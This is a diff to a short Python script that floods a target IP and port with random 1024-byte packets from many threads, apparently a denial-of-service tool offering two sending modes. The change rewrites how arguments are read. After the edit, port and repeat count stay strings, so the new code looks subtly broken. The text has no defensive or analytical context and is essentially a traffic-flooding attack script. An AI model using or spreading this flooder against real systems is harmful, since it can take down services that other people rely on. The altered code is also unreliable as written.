@@ -3,13 +3,8 @@
 import random
 import socket
 import threading
-
 import sys
-ip = str(raw_input(sys.argv[2]))
-port = int(raw_input(sys.argv[3]))
-choice = str(raw_input(sys.argv[4]))
-times = int(raw_input(sys.argv[5]))
-threads = int(raw_input(sys.argv[6]))
+ip, port, choice, times, threads = sys.argv[1:]
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
@@ -32,15 +27,9 @@ def run2():
 			s.connect((ip,port))
 			s.send(data)
 			for x in range(times):
-		
 				s.send(data)
-
-			
 		except:
-		
 			s.close()
-
-
 for y in range(threads):
 	if choice == 'y':
 		th = threading.Thread(target = run)
@@ -48,4 +37,3 @@ for y in range(threads):
 	else:
 		th = threading.Thread(target = run2)
 		th.start()
-
